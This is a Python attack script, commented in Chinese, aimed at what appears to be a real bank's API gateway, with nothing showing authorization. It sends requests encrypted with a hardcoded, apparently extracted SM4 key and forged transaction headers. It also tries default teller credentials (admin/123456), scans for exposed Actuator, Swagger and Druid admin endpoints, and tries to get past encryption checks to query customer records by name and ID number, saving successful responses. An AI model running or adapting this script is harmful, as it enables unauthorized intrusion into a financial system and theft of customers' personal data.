#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""深度漏洞测试 - 使用subprocess调用curl.exe避免代理和引号问题"""
import json, subprocess, time, random, os, tempfile, binascii
from gmssl import sm4

BASE_URL = "https://dl.brcloud.bankofchina.com/dlydjd"
K_E = "714b674e6c796245574d48652b39773d"
OUT_DIR = r"e:\BaiduNetdiskDownload\1\vuln_evidence"
os.makedirs(OUT_DIR, exist_ok=True)

# 清除代理环境变量
env = os.environ.copy()
env['HTTP_PROXY'] = ''
env['HTTPS_PROXY'] = ''
env['NO_PROXY'] = '*'

def sm4_encrypt(data_str, key_hex=K_E):
    key = binascii.unhexlify(key_hex)
    crypt = sm4.CryptSM4()
    crypt.set_key(key, sm4.SM4_ENCRYPT)
    return crypt.crypt_ecb(data_str.encode('utf-8')).hex()

def send_curl(path, body, desc="", method="POST"):
    url = f"{BASE_URL}/{path}"
    
    # 写入临时文件
    fd, tmp_path = tempfile.mkstemp(suffix=".json")
    with os.fdopen(fd, 'w', encoding='utf-8') as f:
        json.dump(body, f, ensure_ascii=False)
    
    cmd = [
        "curl.exe", "-sk", "--noproxy", "*", "--max-time", "20",
        "-X", method, url,
        "-H", "Content-Type: application/json",
        "-H", "Authorization: 987654321",
        "-H", "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 17_0)",
        "--data-binary", f"@{tmp_path}",
        "-w", "\nHTTP_CODE:%{http_code} TIME:%{time_total}s SIZE:%{size_download}"
    ]
    
    start = time.time()
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, env=env, timeout=25)
        resp = result.stdout
    except subprocess.TimeoutExpired:
        resp = "TIMEOUT"
    except Exception as e:
        resp = f"ERROR: {e}"
    finally:
        os.unlink(tmp_path)
    
    duration = round(time.time() - start, 2)
    
    # 解析响应
    http_code = ""
    if "HTTP_CODE:" in resp:
        http_code = resp.split("HTTP_CODE:")[1].split()[0].strip()
    
    ret_code = ""
    ret_msg = ""
    try:
        json_part = resp.rsplit("\nHTTP_CODE:", 1)[0]
        if json_part.strip().startswith("{"):
            j = json.loads(json_part)
            ret_code = j.get("Header", {}).get("RetCode", "")
            ret_msg = j.get("Header", {}).get("RetMsg", "")
    except:
        pass
    
    print(f"\n[{desc}] {method} /{path}")
    print(f"  => HTTP:{http_code} RetCode={ret_code} RetMsg={ret_msg} | {duration}s | Size={len(resp)}")
    
    if ret_code == "000000":
        print(f"  >>> SUCCESS! 响应:")
        print(f"  {json.dumps(j, ensure_ascii=False, indent=2)[:1500]}")
        fname = desc.replace("/", "_").replace(" ", "_")
        with open(os.path.join(OUT_DIR, f"enc_{fname}.json"), 'w', encoding='utf-8') as f:
            json.dump(j, f, ensure_ascii=False, indent=2)
        print(f"  Saved: enc_{fname}.json")
        return j
    elif http_code not in ("404", "000", "") and len(resp) > 50:
        # 显示非404的响应
        preview = resp[:500] if len(resp) <= 500 else resp[:500] + "..."
        print(f"  响应: {preview}")
    elif http_code == "000":
        print(f"  连接失败")
    
    return resp

# 标准请求头
def make_header(tran_code, service_name):
    return {
        "CurrentPageNum": 1, "PageTotalNum": 10, "NoRetCode": True,
        "BranchId": "800000", "LegalRepCode": "10000", "TranTeller": "",
        "TranCode": tran_code, "TranDate": "20260716", "TranTime": "004500000",
        "ServiceName": service_name, "ServiceCode": "D20190130",
        "AuthFlag": "0", "AuthrTellerNo": "1", "Channel": "39",
        "ConsumerId": "1", "GlobalSeq": "1", "GlobalSeqNo": "1",
        "KeyId": "1", "LocalLang": "1", "Mac": "1", "SourceSysId": "1111",
        "TerminalCode": "1121", "TranSeq": "1", "TranSeqNo": "1",
        "TranTellerNo": "1", "ExtendContent": "1", "TotalNum": "0"
    }

# ========== Part 1: isApiUseEncryptionList ==========
print("\n" + "=" * 60)
print("=== Part 1: isApiUseEncryptionList (获取加密API列表) ===")
print("=" * 60)

h1 = make_header("CUST-INFO/isApiUseEncryptionList", "isApiUseEncryptionList")
body1 = {"Header": h1}

for path in ["gateway/admin/isApiUseEncryptionList", "sgp/isApiUseEncryptionList", "sgp/transferRequest"]:
    send_curl(path, body1, f"isApiUseEncryptionList-{path}")

# ========== Part 2: buildNonceToken (K_E加密) ==========
print("\n" + "=" * 60)
print("=== Part 2: buildNonceToken (K_E加密验证) ===")
print("=" * 60)

# 生成随机数据
num1 = 7 * random.randint(500, 999)
num2 = 13 * random.randint(500, 799)
plain = f"{num1}_{num2}"
enc = sm4_encrypt(plain)
print(f"  K_E = {K_E}")
print(f"  明文 = {plain}")
print(f"  SM4加密 = {enc}")

h2 = make_header("CUST-INFO/buildNonceToken", "buildNonceToken")
body2 = {"Header": h2, "data": enc}

for path in ["gateway/admin/buildNonceToken", "sgp/buildNonceToken", "sgp/transferRequest"]:
    send_curl(path, body2, f"buildNonceToken-{path}")

# ========== Part 3: initUserKeyGroup (DH密钥协商) ==========
print("\n" + "=" * 60)
print("=== Part 3: initUserKeyGroup (DH密钥协商) ===")
print("=" * 60)

mode_type = sm4_encrypt("modp1")
app_id = sm4_encrypt("sfs01003001303031")
nonce = f"s{int(time.time()*1000)}{random.randint(100000, 999999)}"
open_id = sm4_encrypt(nonce)

print(f"  modeType = {mode_type}")
print(f"  appId = {app_id}")
print(f"  openId = {open_id}")

h3 = make_header("CUST-INFO/initUserKeyGroup", "initUserKeyGroup")
body3 = {"Header": h3, "negotiateValue": "", "modeType": mode_type, "appId": app_id, "openId": open_id}

for path in ["gateway/admin/initUserKeyGroup", "sgp/initUserKeyGroup", "sgp/transferRequest"]:
    send_curl(path, body3, f"initUserKeyGroup-{path}")

# ========== Part 4: sgpTellerLogin ==========
print("\n" + "=" * 60)
print("=== Part 4: sgpTellerLogin.auth ===")
print("=" * 60)

h4 = make_header("test-Login", "sgpTellerLogin")
body4 = {"Header": h4}
send_curl("sgp/sgpTellerLogin.auth", body4, "sgpTellerLogin-empty")

body4b = {"Header": h4, "tellerId": "admin", "password": "123456", "deviceId": "test"}
send_curl("sgp/sgpTellerLogin.auth", body4b, "sgpTellerLogin-creds")

# ========== Part 5: sgpTellerLogout ==========
print("\n" + "=" * 60)
print("=== Part 5: sgpTellerLogout ===")
print("=" * 60)
h5 = make_header("test-Logout", "sgpTellerLogout")
send_curl("sgp/sgpTellerLogout.auth", {"Header": h5}, "sgpTellerLogout")

# ========== Part 6: queryVerificationCode ==========
print("\n" + "=" * 60)
print("=== Part 6: queryVerificationCode ===")
print("=" * 60)
h6 = make_header("test-queryVerificationCode", "queryVerificationCode")
send_curl("sgp/queryVerificationCode.auth", {"Header": h6}, "queryVerificationCode")

# ========== Part 7: Actuator端点 ==========
print("\n" + "=" * 60)
print("=== Part 7: Actuator/Swagger端点 ===")
print("=" * 60)

actuator_paths = [
    "actuator", "actuator/health", "actuator/env", "actuator/beans",
    "actuator/mappings", "actuator/configprops", "actuator/info",
    "swagger-ui.html", "v2/api-docs", "swagger-resources",
    "druid/", "druid/index.html",
    "gateway/actuator", "gateway/actuator/health",
    "sgp/actuator", "sgp/actuator/health",
    "gateway/admin/", "admin/", "admin/login"
]

for path in actuator_paths:
    url = f"{BASE_URL}/{path}"
    cmd = ["curl.exe", "-sk", "--noproxy", "*", "--max-time", "8", "-X", "GET", url,
           "-H", "Authorization: 987654321", "-H", "User-Agent: Mozilla/5.0",
           "-w", "\nHTTP_CODE:%{http_code} SIZE:%{size_download}"]
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, env=env, timeout=12)
        resp = result.stdout
    except:
        continue
    
    http_code = ""
    size = ""
    if "HTTP_CODE:" in resp:
        parts = resp.split("HTTP_CODE:")[1].split()
        if parts:
            http_code = parts[0].strip()
        for p in parts:
            if "SIZE:" in p:
                size = p.split("SIZE:")[1]
    
    if http_code == "200" and size and int(size) > 10:
        print(f"  [FOUND] /{path} => HTTP 200 | Size: {size}")
        body_content = resp.rsplit("\nHTTP_CODE:", 1)[0]
        print(f"  {body_content[:300]}")
    elif http_code not in ("404", "000", ""):
        print(f"  [HTTP {http_code}] /{path} Size:{size}")
    
    time.sleep(0.2)

# ========== Part 8: 测试已知成功的API + K_E加密 ==========
print("\n" + "=" * 60)
print("=== Part 8: 用K_E加密访问客户敏感信息API ===")
print("=" * 60)

# selectPersonCust (之前返回E1004需要加密)
# 尝试用K_E加密整个body
h8 = make_header("CUST-INFO/selectPersonCust", "selectPersonCust")
body8_plain = {"Header": h8, "custName": "test", "certNo": "test"}
body8_json = json.dumps({"Header": h8, "custName": "test", "certNo": "test"})

# 方式1: 直接发送（之前返回E1004）
send_curl("sgp/transferRequest", body8_plain, "selectPersonCust-plain")

# 方式2: 用K_E加密body（除Header外的部分）
body8_enc = {"Header": h8, "data": sm4_encrypt(json.dumps({"custName": "test", "certNo": "test"}))}
send_curl("sgp/transferRequest", body8_enc, "selectPersonCust-encrypted")

# 方式3: 用K_E加密整个body
body8_full_enc = {"Header": h8, "message": sm4_encrypt(json.dumps({"custName": "test", "certNo": "test"}))}
send_curl("sgp/transferRequest", body8_full_enc, "selectPersonCust-msg-encrypted")

print("\n=== 全部测试完成 ===")
